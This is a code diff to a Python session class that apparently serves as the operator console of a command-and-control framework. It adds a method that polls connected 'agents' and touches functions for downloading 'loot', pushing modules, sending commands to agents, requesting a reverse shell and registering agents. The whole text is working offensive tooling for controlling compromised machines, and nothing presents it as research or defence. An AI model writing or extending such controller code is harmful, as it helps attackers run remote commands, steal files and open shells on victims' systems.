@@ -74,6 +74,27 @@ class Session():
         
         print("[+] Successfully gathered agent information")
 
+    def update(self):
+        out = ""
+        tmp = self.agents
+        self.agents = []
+        self.channel.sendall("20|all")
+        while out != "fi":
+            out = self.channel.recv(8196).decode()
+            if out != "fi":
+                out = out.split("\n")
+                if len(out) < 5:
+                    print("Out was too short of a fuckin list")
+                    continue
+
+                interfaces = self.parse_interfaces(out[1])
+                appnd = AgentStruct(out[0],out[2],out[3],interfaces,out[4])
+                self.agents.append(appnd)
+                self.channel.sendall('0')
+        
+        print("[+] Successfully gathered agent information")
+        return 0
+
     def download_loot(self, agent_id):
         filepath = "."#misc.getSavePath()
         cnt=0
@@ -120,7 +141,8 @@ class Session():
             else:
                 print("[+] Got finished notification")
                 break  
-        print("Complete")     
+        print("Complete")
+        return 0
 
     def upload_file(self, agent_id, file):
         print("[ ] Doing upload")
@@ -137,18 +159,19 @@ class Session():
         self.channel.send(buff)
         ret = self.channel.recv(3)
         print("[+] Success")
-    
+        return 0
+
     def do_download(self, agent_id, path):
         print("[ ] Doing Download...")
         self.channel.sendall("24|%s:%s" % (agent_id, path))
         self.channel.recv(2)
         print("[+] Tasked agent with download")
+        return 0
 
     def push_module(self, agent_id, filestruct):
         print("[ ] Pushing module file to agent %s..." % agent_id)
         self.channel.sendall("25|%s" % agent_id)
         self.channel.recv(3)
-        print(filestruct.filename)
         self.channel.send(filestruct.filename)
         self.channel.recv(3)
         
@@ -159,10 +182,12 @@ class Session():
         self.channel.send(buff)
         ret = self.channel.recv(3)
         print("[+] Success")
+        return 0
 
     def send_command(self, agent_id, command):
         print("[ ] Sending command to agent...")
         self.channel.sendall("26|%s:%s" % (agent_id, command))
+        return 0
 
     def req_revsh(self, agent_id, port):
         print("[ ] Sending Reverse Shell Request...")
@@ -183,10 +208,12 @@ class Session():
         print(len(fileData))
         file = b64.decodebytes(fileData[:size])
         misc.save_file(file)
+        return 0
 
     def register_agent(self, name, password):
         print("[ ] Registering agent with server...")
         self.channel.sendall('29|%s:%s' % (name, password))
+        return 0
 
     def clean_exit(self):
         self.channel.sendall("00")
